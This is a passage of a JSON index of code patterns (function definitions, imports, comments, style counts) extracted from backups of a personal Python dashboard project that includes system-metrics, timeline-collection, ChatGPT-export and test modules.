          "def run_diagnostics(self):\n\"\"\"Run all diagnostics and fixes.\"\"\"\ndashboard_files = list(self.dashboard_path.rglob('*.py'))\nfor file_path in dashboard_files:\nself.logger.info(f'Checking {file_path}')\nindent_issues = self.check_indentation(file_path)\ntry_except_issues = self.check_try_except(file_path)\nnetwork_issues = self.check_network_metrics(file_path)\nif indent_issues:\nself.logger.info(f'Fixing indentation issues in {file_path}')",
          "def main():"
        ],
        "class_defs": [
          "class DashboardDiagnostics:"
        ],
        "imports": [
          "import ast",
          "import logging",
          "from pathlib import Path",
          "from typing import Dict, List, Tuple",
          "import tokenize",
          "import io"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 10,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/tools/export_chatgpt.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def _count_tokens(self, text: str) -> int:\n\"\"\"Count tokens in text.\"\"\"\nreturn len(self.encoding.encode(text))\n\ndef _format_conversation(self, raw_conversation: Dict) -> Dict:\n\"\"\"Format a raw conversation into our memory format.\"\"\"",
          "def _format_conversation(self, raw_conversation: Dict) -> Dict:\n\"\"\"Format a raw conversation into our memory format.\"\"\"\ntry:\nmessages = []\nfor msg in raw_conversation.get('messages', []):\nmessages.append({\n'role': msg.get('role', 'unknown'),\n'content': msg.get('content', ''),\n'tokens': self._count_tokens(msg.get('content', '')),\n'metadata': {",
          "def export_conversations(self, conversations_dir: str):\n\"\"\"Export conversations from the given directory.\"\"\"\ntry:\nsource_dir = Path(conversations_dir)\nif not source_dir.exists():\nlogger.error(f\"Source directory not found: {source_dir}\")\nreturn\n\n# Process each conversation file\nexported = []",
          "def main():\n\"\"\"Export ChatGPT conversations.\"\"\"\n# Configure logging\nlogging.basicConfig(\nlevel=logging.INFO,\nformat='%(asctime)s - %(name)s - %(levelname)s - %(message)s'\n)\n\n# Default ChatGPT conversation directory\ndefault_dir = os.path.expanduser('~/Library/Application Support/OpenAI/conversations')"
        ],
        "class_defs": [
          "class ChatGPTExporter:"
        ],
        "imports": [
          "import os",
          "import json",
          "import logging",
          "from pathlib import Path",
          "from datetime import datetime",
          "import tiktoken",
          "from typing import Dict, List, Optional"
        ],
        "comments": [
          "# Process each conversation file",
          "# Save all conversations",
          "# Configure logging",
          "# Default ChatGPT conversation directory",
          "# Create exporter and run export"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/tests/integration/test_system.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import pytest",
          "from datetime import datetime, timedelta",
          "import asyncio",
          "import aiohttp",
          "import json",
          "from src.metrics import MetricsCollector",
          "from src.database import Database",
          "from src.api import APIServer",
          "from src.alerting import AlertManager",
          "from src.visualization import DashboardView"
        ],
        "comments": [
          "# Collect and store metrics",
          "# Verify metrics were stored",
          "# Verify metric format",
          "# Configure test alert",
          "# Trigger alert and verify notification",
          "# Verify notification was sent",
          "# Start collection",
          "# Wait for some metrics to be collected",
          "# Stop collection",
          "# Verify metrics in database",
          "# Verify specific metrics were collected",
          "# Request dashboard data",
          "# Verify metric data structure",
          "# Connect to WebSocket",
          "# Wait for initial data",
          "# Send test message",
          "# Verify subscription response",
          "# Wait for updates",
          "# Store test metrics",
          "# Test aggregation",
          "# Insert old metrics",
          "# Insert recent metrics",
          "# Run retention cleanup",
          "# Verify old metrics were removed"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": [
          "@pytest.mark.integration",
          "@pytest.mark.asyncio",
          "@pytest.mark.integration",
          "@pytest.mark.asyncio",
          "@pytest.mark.integration",
          "@pytest.mark.asyncio",
          "@pytest.mark.integration",
          "@pytest.mark.asyncio",
          "@pytest.mark.integration",
          "@pytest.mark.asyncio",
          "@pytest.mark.integration",
          "@pytest.mark.asyncio",
          "@pytest.mark.integration"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/tests/performance/test_load.py",
        "docstrings": [],
        "function_defs": [
          "def test_memory_usage(mock_metrics_collector):\n\"\"\"Test memory usage during operation.\"\"\"\ninitial_memory = psutil.Process().memory_info().rss\n\n# Perform memory-intensive operations\ndata = []\nfor i in range(10000):\ndata.append({\n\"name\": \"test_metric\",\n\"value\": i,"
        ],
        "class_defs": [],
        "imports": [
          "import pytest",
          "import asyncio",
          "import time",
          "from datetime import datetime, timedelta",
          "import aiohttp",
          "import statistics",
          "from typing import List, Dict, Any",
          "import psutil",
          "import json"
        ],
        "comments": [
          "# Make requests in batches",
          "# Wait for batch to complete",
          "# Calculate statistics",
          "# Assert performance meets requirements",
          "# Assert collection performance",
          "# Start receiving messages",
          "# Wait for messages",
          "# Cleanup",
          "# Start clients",
          "# Wait for all clients",
          "# Analyze results",
          "# Assert performance",
          "# Insert test data",
          "# Test different query patterns",
          "# Simple selection",
          "# Time range query",
          "# Aggregation query",
          "# Run queries multiple times",
          "# Assert performance",
          "# Perform memory-intensive operations",
          "# Convert to JSON to simulate real usage",
          "# Check memory after operations",
          "# Assert reasonable memory usage",
          "# Run all operations concurrently",
          "# Assert performance under concurrent load"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 5,
        "decorators": [
          "@pytest.mark.performance",
          "@pytest.mark.asyncio",
          "@pytest.mark.performance",
          "@pytest.mark.asyncio",
          "@pytest.mark.performance",
          "@pytest.mark.asyncio",
          "@pytest.mark.performance",
          "@pytest.mark.asyncio",
          "@pytest.mark.performance",
          "@pytest.mark.performance",
          "@pytest.mark.asyncio"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/tests/unit/test_core.py",
        "docstrings": [],
        "function_defs": [
          "def test_metrics_collector_initialization(mock_metrics_collector):\n\"\"\"Test metrics collector initialization.\"\"\"\nassert mock_metrics_collector is not None\nassert hasattr(mock_metrics_collector, 'collect_metric')\nassert hasattr(mock_metrics_collector, 'get_metric')\n\ndef test_metric_collection(mock_metrics_collector):\n\"\"\"Test basic metric collection.\"\"\"",
          "def test_metric_collection(mock_metrics_collector):\n\"\"\"Test basic metric collection.\"\"\"\n# Collect test metrics\nmock_metrics_collector.collect_metric(\"cpu_usage\", 45.2)\nmock_metrics_collector.collect_metric(\"memory_usage\", 75.5)\n\n# Verify metrics were collected\ncpu_metrics = mock_metrics_collector.get_metric(\"cpu_usage\")\nmemory_metrics = mock_metrics_collector.get_metric(\"memory_usage\")\n",
          "def test_metric_time_range(mock_metrics_collector):\n\"\"\"Test metric collection with time ranges.\"\"\"\nstart_time = datetime.now()\n\n# Collect metrics at different times\nmock_metrics_collector.collect_metric(\"cpu_usage\", 45.2, start_time.timestamp())\nmock_metrics_collector.collect_metric(\"cpu_usage\", 48.5, (start_time + timedelta(minutes=1)).timestamp())\nmock_metrics_collector.collect_metric(\"cpu_usage\", 42.1, (start_time + timedelta(minutes=2)).timestamp())\n\n# Query with time range",
          "def test_alert_manager():\n\"\"\"Test alert manager functionality.\"\"\"\nalert_manager = AlertManager()\n\n# Configure test alert\nalert_config = {\n\"name\": \"high_cpu_usage\",\n\"metric\": \"cpu_usage\",\n\"threshold\": 90.0,\n\"duration\": 300,  # 5 minutes",
          "def test_metric_query():\n\"\"\"Test metric query building and execution.\"\"\"\nquery = MetricQuery(\"cpu_usage\")\nquery.add_filter(\"instance\", \"server-01\")\nquery.add_timerange(\ndatetime.now() - timedelta(hours=1),\ndatetime.now()\n)\nquery.add_aggregation(\"avg\", \"5m\")\n",
          "def test_timerange():\n\"\"\"Test time range calculations.\"\"\"\nnow = datetime.now()\ntimerange = TimeRange(\nnow - timedelta(hours=1),\nnow\n)\n\nassert timerange.duration == timedelta(hours=1)\nassert timerange.contains(now - timedelta(minutes=30))",
          "def test_json_serialization():\n\"\"\"Test JSON serialization of dashboard data structures.\"\"\"\ndata = {\n\"metrics\": [\n{\n\"name\": \"cpu_usage\",\n\"value\": 45.2,\n\"timestamp\": datetime.now().timestamp()\n}\n],"
        ],
        "class_defs": [],
        "imports": [
          "import pytest",
          "from datetime import datetime, timedelta",
          "import json",
          "from src.metrics import MetricsCollector",
          "from src.visualization import DashboardView",
          "from src.alerting import AlertManager",
          "from src.utils import TimeRange, MetricQuery"
        ],
        "comments": [
          "# Collect test metrics",
          "# Verify metrics were collected",
          "# Collect metrics at different times",
          "# Query with time range",
          "# Add some test metrics",
          "# Generate dashboard view",
          "# Configure test alert",
          "# Test alert triggering",
          "# Test alert resolution",
          "# Verify query structure",
          "# Test serialization"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 3,
        "error_handling": 0,
        "decorators": [
          "@pytest.mark.asyncio"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/src/collectors/timeline_collector.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def _extract_date_from_filename(self, filename: str) -> Optional[str]:\n\"\"\"Extract date from filename using common patterns.\"\"\"\ndate_patterns = [\nr'(\\d{4}-\\d{2}-\\d{2})',\nr'(\\d{8})',\nr'(\\d{4}\\d{2}\\d{2})',\n]\n\nfor pattern in date_patterns:\nmatch = re.search(pattern, filename)",
          "def _extract_context(self, text: str, match_pos: int, context_size: int = 200) -> str:\n\"\"\"Extract context around a match position.\"\"\"\nstart = max(0, match_pos - context_size)\nend = min(len(text), match_pos + context_size)\nreturn text[start:end].strip()\n\ndef _identify_components(self, text: str) -> List[Tuple[str, str]]:\n\"\"\"Identify components and their types from text.\"\"\"",
          "def _identify_components(self, text: str) -> List[Tuple[str, str]]:\n\"\"\"Identify components and their types from text.\"\"\"\ncomponents = []\nfor pattern, comp_type in self.component_patterns:\nmatches = re.finditer(pattern, text, re.IGNORECASE)\nfor match in matches:\ncomponents.append((match.group(1).strip(), comp_type))\nreturn components\n\ndef collect_from_file(self, file_path: Path) -> List[TimelineEvent]:",
          "def collect_from_file(self, file_path: Path) -> List[TimelineEvent]:\n\"\"\"Process a single file for timeline events.\"\"\"\nevents = []\ntry:\ncontent = file_path.read_text(errors='ignore')\nsource = str(file_path.relative_to(self.base_path))\ndate = self._extract_date_from_filename(file_path.name) or datetime.fromtimestamp(\nfile_path.stat().st_mtime\n).strftime('%Y-%m-%d')\n",
          "def collect_all(self) -> Dict:\n\"\"\"Collect timeline data from all sources.\"\"\"\nself.events = []\nself.phase_mapping.clear()\n\n# Process conversation files\nfor base_path in self.conversation_paths:\nif not base_path.exists():\ncontinue\n",
          "def main():\n\"\"\"Test the timeline collector.\"\"\"\ncollector = TimelineCollector()\ntimeline_data = collector.collect_all()\n\noutput_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/timeline')\noutput_path.mkdir(parents=True, exist_ok=True)\n\nwith open(output_path / 'timeline_data.json', 'w') as f:\njson.dump(timeline_data, f, indent=2)"
        ],
        "class_defs": [
          "class TimelineEvent:",
          "class TimelineCollector:"
        ],
        "imports": [
          "import os",
          "import re",
          "import json",
          "import logging",
          "from pathlib import Path",
          "from datetime import datetime",
          "from typing import Dict, List, Optional, Tuple",
          "from dataclasses import dataclass, asdict",
          "from collections import defaultdict"
        ],
        "comments": [
          "# Patterns to identify project phases and events",
          "# Patterns for component identification",
          "# Extract phases and components",
          "# Process conversation files",
          "# Group events by month for the timeline",
          "# Calculate summary statistics",
          "# Prepare date range"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/src/config/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/src/config/service_config.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def create_dirs(self):\n\"\"\"Create required directories.\"\"\"\nself.config_dir.mkdir(parents=True, exist_ok=True)\nself.data_dir.mkdir(parents=True, exist_ok=True)\nself.log_dir.mkdir(parents=True, exist_ok=True)\nself.state_dir.mkdir(parents=True, exist_ok=True)\n\ndef _load_config(self):\n\"\"\"Load configuration or create default.\"\"\"",
          "def _load_config(self):\n\"\"\"Load configuration or create default.\"\"\"\nconfig_file = self.config_dir / 'services.json'\n\nif config_file.exists():\nwith open(config_file) as f:\nreturn json.load(f)\n\n# Default configuration\ndefault_config = {",
          "def update_config(self, updates):\n\"\"\"Update configuration with new values.\"\"\"\nself.config.update(updates)\n\nwith open(self.config_dir / 'services.json', 'w') as f:\njson.dump(self.config, f, indent=2)\n\ndef get_service_config(self, service_name: str) -> dict:\n\"\"\"Get configuration for a service.\"\"\"",
          "def get_service_config(self, service_name: str) -> dict:\n\"\"\"Get configuration for a service.\"\"\"\nconfig_file = self.config_dir / f\"{service_name}.json\"\nif config_file.exists():\ntry:\nwith open(config_file) as f:\nreturn json.load(f)\nexcept Exception as e:\nlogging.error(f\"Error loading config for {service_name}: {e}\")\n",
          "def get_log_config(self) -> dict:\n\"\"\"Get logging configuration.\"\"\"\nconfig_file = self.config_dir / \"logging.json\"\nif config_file.exists():\ntry:\nwith open(config_file) as f:\nreturn json.load(f)\nexcept Exception:\npass\n",
          "def get_pid_file(self, service_name):\n\"\"\"Get PID file path for service.\"\"\"\nreturn self.log_dir / f'{service_name}.pid'\n\ndef get_log_file(self, service_name):\n\"\"\"Get log file path for service.\"\"\"",
          "def get_log_file(self, service_name):\n\"\"\"Get log file path for service.\"\"\"\nreturn self.log_dir / f'{service_name}.log'\n\ndef get_state_file(self, service_name):\n\"\"\"Get state file path for service.\"\"\"",
          "def get_state_file(self, service_name):\n\"\"\"Get state file path for service.\"\"\"\nreturn self.state_dir / f'{service_name}_state.json'\n\n# Global configuration instance\nservice_config = ServiceConfig()\n"
        ],
        "class_defs": [
          "class ServiceConfig:"
        ],
        "imports": [
          "from pathlib import Path",
          "import json",
          "import os"
        ],
        "comments": [
          "# Default logging configuration",
          "# Default configuration",
          "# Save default config",
          "# Global configuration instance"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/src/core/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from .data_processor import DataProcessor",
          "from .websocket_server import DashboardWebSocket",
          "from .orchestrator import DashboardOrchestrator"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/src/core/data_processor.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, num_workers: int=4, cache_ttl: int=300):",
          "def setup_logging(self):",
          "def _hash_data(self, data: Any) -> str:\n\"\"\"Generate a consistent hash for data structures.\"\"\"\nif isinstance(data, (dict, list)):\nreturn hashlib.md5(json.dumps(data, sort_keys=True).encode()).hexdigest()\nreturn hashlib.md5(str(data).encode()).hexdigest()\n\ndef _is_cached(self, data_hash: str) -> bool:\n\"\"\"Check if data is cached and not expired.\"\"\"",
          "def _is_cached(self, data_hash: str) -> bool:\n\"\"\"Check if data is cached and not expired.\"\"\"\nreturn data_hash in self.cache and data_hash in self.cache_ttl and (time.time() < self.cache_ttl[data_hash])\n\ndef process_data_chunk(self, chunk: Dict, operation: str=None) -> Dict:\n\"\"\"Process a single data chunk with caching.\"\"\"",
          "def process_data_chunk(self, chunk: Dict, operation: str=None) -> Dict:\n\"\"\"Process a single data chunk with caching.\"\"\"\nchunk_hash = self._hash_data((chunk, operation))\nif self._is_cached(chunk_hash):\nself.logger.debug(f'Cache hit for operation {operation}')\nreturn self.cache[chunk_hash]\ntry:\nif operation == 'aggregate':\nresult = self.timeline_aggregator.aggregate_data(chunk)\nelif operation == 'analyze':",
          "def _process_chunk(self, chunk: Dict) -> Dict:\n\"\"\"Default chunk processing logic.\"\"\"\nprocessed = {'timestamp': datetime.now().isoformat(), 'data': chunk, 'metadata': {'processed_at': datetime.now().isoformat(), 'processor_version': '1.0'}}\nreturn processed\n\ndef _analyze_chunk(self, chunk: Dict) -> Dict:\n\"\"\"Analyze chunk for patterns and anomalies.\"\"\"",
          "def _analyze_chunk(self, chunk: Dict) -> Dict:\n\"\"\"Analyze chunk for patterns and anomalies.\"\"\"\nanalysis = {'patterns': self._find_patterns(chunk), 'anomalies': self._detect_anomalies(chunk), 'statistics': self._compute_statistics(chunk)}\nreturn analysis\n\ndef process_dataset(self, dataset: List[Dict], operation: str=None) -> List[Dict]:\n\"\"\"Process multiple data chunks in parallel.\"\"\"",
          "def process_dataset(self, dataset: List[Dict], operation: str=None) -> List[Dict]:\n\"\"\"Process multiple data chunks in parallel.\"\"\"\ntry:\nchunk_size = 1000\nchunks = [dataset[i:i + chunk_size] for i in range(0, len(dataset), chunk_size)]\nfutures = []\nfor chunk in chunks:\nfuture = self.executor.submit(self.process_data_chunk, chunk, operation)\nfutures.append(future)\nresults = []",
          "def _find_patterns(self, data: Dict) -> List[Dict]:\n\"\"\"Find patterns in data.\"\"\"\npatterns = []\nreturn patterns\n\ndef _detect_anomalies(self, data: Dict) -> List[Dict]:\n\"\"\"Detect anomalies in data.\"\"\"",
          "def _detect_anomalies(self, data: Dict) -> List[Dict]:\n\"\"\"Detect anomalies in data.\"\"\"\nanomalies = []\nreturn anomalies\n\ndef _compute_statistics(self, data: Dict) -> Dict:\n\"\"\"Compute statistical metrics.\"\"\"",
          "def _compute_statistics(self, data: Dict) -> Dict:\n\"\"\"Compute statistical metrics.\"\"\"\nstats = {}\nreturn stats\n\ndef cleanup_cache(self):\n\"\"\"Remove expired cache entries.\"\"\"",
          "def cleanup_cache(self):\n\"\"\"Remove expired cache entries.\"\"\"\ncurrent_time = time.time()\nexpired = [k for k, v in self.cache_ttl.items() if current_time > v]\nfor key in expired:\ndel self.cache[key]\ndel self.cache_ttl[key]\n\nclass EventBuffer:\n",
          "def __init__(self, max_size: int=10000):",
          "def add_event(self, event: Dict):\n\"\"\"Add event to buffer and process with handlers.\"\"\"\nif not self._should_process(event):\nreturn\nself.buffer.append(event)\nfor handler in self.handlers:\ntry:\nhandler(event)\nexcept Exception as e:\nlogging.error(f'Error in event handler: {str(e)}')",
          "def add_handler(self, handler):\n\"\"\"Add event processing handler.\"\"\"\nself.handlers.append(handler)\n\ndef add_filter(self, filter_func):\n\"\"\"Add event filter.\"\"\"",
          "def add_filter(self, filter_func):\n\"\"\"Add event filter.\"\"\"\nself.filters.append(filter_func)\n\ndef _should_process(self, event: Dict) -> bool:\n\"\"\"Check if event passes all filters.\"\"\"",
          "def _should_process(self, event: Dict) -> bool:\n\"\"\"Check if event passes all filters.\"\"\"\nreturn all((f(event) for f in self.filters))\n\ndef get_events(self, count: int=None) -> List[Dict]:\n\"\"\"Get recent events, optionally limited by count.\"\"\"",
          "def get_events(self, count: int=None) -> List[Dict]:\n\"\"\"Get recent events, optionally limited by count.\"\"\"\nif count is None:\nreturn list(self.buffer)\nreturn list(self.buffer)[-count:]\n\nclass TimelineAggregator:\n\ndef __init__(self):\nself.resolution_map = {'1h': timedelta(minutes=1), '6h': timedelta(minutes=5), '1d': timedelta(minutes=15), '7d': timedelta(hours=1), '30d': timedelta(hours=6), '90d': timedelta(days=1)}",
          "def __init__(self):",
          "def aggregate_data(self, events: List[Dict], timespan: str='24h') -> List[Dict]:\n\"\"\"Aggregate events based on timespan.\"\"\"\nresolution = self._get_resolution(timespan)\nreturn self._bucket_events(events, resolution)\n\ndef _get_resolution(self, timespan: str) -> timedelta:\n\"\"\"Get appropriate time resolution for timespan.\"\"\"",
          "def _get_resolution(self, timespan: str) -> timedelta:\n\"\"\"Get appropriate time resolution for timespan.\"\"\"\nreturn self.resolution_map.get(timespan, timedelta(hours=1))\n\ndef _bucket_events(self, events: List[Dict], resolution: timedelta) -> List[Dict]:\n\"\"\"Group events into time buckets.\"\"\"",
          "def _bucket_events(self, events: List[Dict], resolution: timedelta) -> List[Dict]:\n\"\"\"Group events into time buckets.\"\"\"\nbuckets = defaultdict(list)\nfor event in events:\ntry:\nevent_time = datetime.fromisoformat(event['timestamp'])\nbucket_time = self._round_time(event_time, resolution)\nbuckets[bucket_time].append(event)\nexcept (KeyError, ValueError) as e:\nlogging.error(f'Error processing event for bucketing: {str(e)}')",
          "def _round_time(self, dt: datetime, resolution: timedelta) -> datetime:\n\"\"\"Round datetime to nearest resolution.\"\"\"\nseconds = int(resolution.total_seconds())\ntimestamp = int(dt.timestamp())\nreturn datetime.fromtimestamp(timestamp - timestamp % seconds)\n\ndef _summarize_buckets(self, buckets: Dict) -> List[Dict]:\n\"\"\"Create summaries for each time bucket.\"\"\"",
          "def _summarize_buckets(self, buckets: Dict) -> List[Dict]:\n\"\"\"Create summaries for each time bucket.\"\"\"\nsummaries = []\nfor bucket_time, events in sorted(buckets.items()):\nsummary = {'timestamp': bucket_time.isoformat(), 'count': len(events), 'types': self._count_types(events), 'summary': self._create_summary(events)}\nsummaries.append(summary)\nreturn summaries\n\ndef _count_types(self, events: List[Dict]) -> Dict:\n\"\"\"Count occurrences of each event type.\"\"\"",
          "def _count_types(self, events: List[Dict]) -> Dict:\n\"\"\"Count occurrences of each event type.\"\"\"\ncounts = defaultdict(int)\nfor event in events:\ncounts[event.get('type', 'unknown')] += 1\nreturn dict(counts)\n\ndef _create_summary(self, events: List[Dict]) -> str:\n\"\"\"Create a textual summary of events.\"\"\"",
          "def _create_summary(self, events: List[Dict]) -> str:\n\"\"\"Create a textual summary of events.\"\"\"\nif not events:\nreturn 'No events'\ntype_counts = self._count_types(events)\nsummary_parts = []\nfor event_type, count in type_counts.items():\nsummary_parts.append(f'{count} {event_type} events')\nreturn ', '.join(summary_parts)\n",
          "def __init__(self):",
          "def update_dataset(self, dataset_id: str, new_data: Dict) -> Optional[Dict]:\n\"\"\"Update dataset with only changed data.\"\"\"\nlast_state = self.last_update.get(dataset_id)\nif not last_state:\nself.last_update[dataset_id] = new_data\nreturn new_data\nchanges = self._compute_diff(last_state, new_data)\nif not changes:\nreturn None\nupdated = self._apply_changes(last_state, changes)",
          "def _compute_diff(self, old_data: Dict, new_data: Dict) -> Dict:\n\"\"\"Compute differences between old and new data.\"\"\"\ndiff = {'added': {}, 'modified': {}, 'removed': set()}\nfor key, value in new_data.items():\nif key not in old_data:\ndiff['added'][key] = value\nelif old_data[key] != value:\ndiff['modified'][key] = value\ndiff['removed'] = set(old_data.keys()) - set(new_data.keys())\nreturn diff if diff['added'] or diff['modified'] or diff['removed'] else None",
          "def _apply_changes(self, data: Dict, changes: Dict) -> Dict:\n\"\"\"Apply computed changes to data.\"\"\"\nresult = data.copy()\nresult.update(changes['added'])\nresult.update(changes['modified'])\nfor key in changes['removed']:\nresult.pop(key, None)\nreturn result\n\ndef get_change_log(self, dataset_id: str=None) -> List[Dict]:",
          "def get_change_log(self, dataset_id: str=None) -> List[Dict]:\n\"\"\"Get change history, optionally filtered by dataset.\"\"\"\nif dataset_id:\nreturn [log for log in self.change_log if log['dataset_id'] == dataset_id]\nreturn list(self.change_log)\n\ndef main():\n\"\"\"Initialize and run a test of the data processor.\"\"\"",
          "def main():\n\"\"\"Initialize and run a test of the data processor.\"\"\"\nprocessor = DataProcessor()\nprocessor.logger.info('Data processor initialized and ready')"
        ],
        "class_defs": [
          "class DataProcessor:",
          "class EventBuffer:",
          "class TimelineAggregator:",
          "class IncrementalUpdater:"
        ],
        "imports": [
          "import os",
          "import json",
          "import time",
          "import hashlib",
          "import logging",
          "from pathlib import Path",
          "from typing import Dict, List, Any, Optional",
          "from datetime import datetime, timedelta",
          "from collections import defaultdict, deque",
          "from concurrent.futures import ThreadPoolExecutor, as_completed"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 10,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard",
    "name": "dashboard",
    "languages": [
      "Python",
      "JavaScript"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_174657/docs/dashboard/app.py",
        "docstrings": [],
        "function_defs": [
          "def generate_metrics():\n\"\"\"Generate current system metrics.\"\"\"\ntry:\nmem = psutil.virtual_memory()\ndisk = psutil.disk_usage('/')\nnet_io = psutil.net_io_counters(pernic=True)\nreturn {\n'cpu_percent': psutil.cpu_percent(interval=1),\n'memory_percent': mem.percent,\n'disk_percent': disk.percent,",
          "def send_metrics():\n\"\"\"SSE event generator.\"\"\"\ntry:\nwhile True:\nmetrics = generate_metrics()\nyield f\"data: {json.dumps(metrics)}\\n\\n\"\nsleep(2)  # Update every 2 seconds\nexcept GeneratorExit:\npass\n",
          "def healthz():\n\"\"\"Health check endpoint.\"\"\"\ntry:\n# Basic system checks\npsutil.cpu_percent()\npsutil.virtual_memory()\npsutil.disk_usage('/')\nreturn jsonify({\n'status': 'healthy',\n'timestamp': datetime.now().isoformat()",
          "def get_system_stats():\n\"\"\"Get comprehensive system statistics.\"\"\"\ntry:\nstats = {\n\"video_processing\": get_video_processing_stats(),\n\"file_mover\": get_file_mover_stats(),\n\"ssh_tunnel\": get_ssh_tunnel_stats(),\n\"events\": get_recent_events()\n}\nreturn jsonify(stats)",
          "def get_video_processing_stats():\n\"\"\"Get video processing statistics.\"\"\"\ntry:\n# Connect to PersonalAssistant SQLite database\ndb_path = Path(\"/Volumes/Mac Mini External/video_enhancer/PersonalAssistant/data.db\")\nif not db_path.exists():\nreturn {\"status\": \"database not found\"}\n\nconn = sqlite3.connect(str(db_path))\ncursor = conn.cursor()",
          "def get_file_mover_stats():\n\"\"\"Get file mover statistics.\"\"\"\ntry:\nbase_path = Path(\"/Volumes/Mac Mini External/MemoryCore\")\n\n# Read hash index\nhash_index = {}\nhash_index_path = base_path / \"hash_index.json\"\nif hash_index_path.exists():\nwith open(hash_index_path) as f:",
          "def get_ssh_tunnel_stats():\n\"\"\"Get SSH tunnel statistics.\"\"\"\ntry:\n# Check tunnel process\nps = subprocess.run(\n[\"ps\", \"aux\"],\ncapture_output=True,\ntext=True\n)\ntunnel_running = \"ssh.*reverse.*tunnel\" in ps.stdout",
          "def get_recent_events():\n\"\"\"Get recent events across all systems.\"\"\"\nevents = []\n\ntry:\n# Check video processing events\ndb_path = Path(\"/Volumes/Mac Mini External/video_enhancer/PersonalAssistant/data.db\")\nif db_path.exists():\nconn = sqlite3.connect(str(db_path))\ncursor = conn.cursor()",
          "def events():\n\"\"\"SSE endpoint for live metrics.\"\"\"\nreturn Response(\nsend_metrics(),\nmimetype='text/event-stream',\nheaders={\n'Cache-Control': 'no-cache',\n'Connection': 'keep-alive',\n'X-Accel-Buffering': 'no'\n}",
          "def format_bytes(bytes):\n\"\"\"Format bytes to human readable string.\"\"\"\nfor unit in ['B', 'KB', 'MB', 'GB', 'TB']:\nif bytes < 1024:\nreturn f\"{bytes:.1f}{unit}\"\nbytes /= 1024\nreturn f\"{bytes:.1f}TB\"\n\n@app.route('/')\ndef index():",
          "def index():\n\"\"\"Dashboard home page.\"\"\"\ntry:\nmem = psutil.virtual_memory()\ndisk = psutil.disk_usage('/')\n\n# Count running processes safely\nrunning_processes = 0\ntry:\nfor proc in psutil.process_iter(['status']):",
          "def status():\n\"\"\"Get rich system status data.\"\"\"\ntry:\n# Get CPU metrics safely\ntry:\ncpu_metrics = psutil.cpu_percent(interval=1, percpu=True)\nexcept Exception:\ncpu_metrics = [0.0]\n\n# Get process metrics safely"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import psutil",
          "import json",
          "import sqlite3",
          "from datetime import datetime, timedelta",
          "from pathlib import Path",
          "from flask import Flask, request, jsonify, render_template, session, redirect, url_for, Response",
          "from flask_cors import CORS",
          "from threading import Lock",
          "from time import sleep",
          "from queue import Queue",
          "import subprocess"
        ],
        "comments": [
          "# Initialize Flask application",
          "# Global state for SSE",
          "# Basic system checks",
          "# Connect to PersonalAssistant SQLite database",
          "# Get processing statistics",
          "# Get active tasks",
          "# Read hash index",
          "# Count conflicts",
          "# Get recent movements from ledger",
          "# Check tunnel process",
          "# Check API endpoint",
          "# Check video processing events",
          "# Check file mover events",
          "# Count running processes safely",
          "# Get network metrics safely",
          "# Get CPU metrics safely",
          "# Get process metrics safely",
          "# Get disk metrics safely",
          "# Get network metrics safely"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 36,
        "decorators": [
          "@app.route('/healthz')",
          "@app.route('/api/stats')",
          "@app.route('/events')",
          "@app.route('/')",
          "@app.route('/api/status')"
        ]
      },
      {
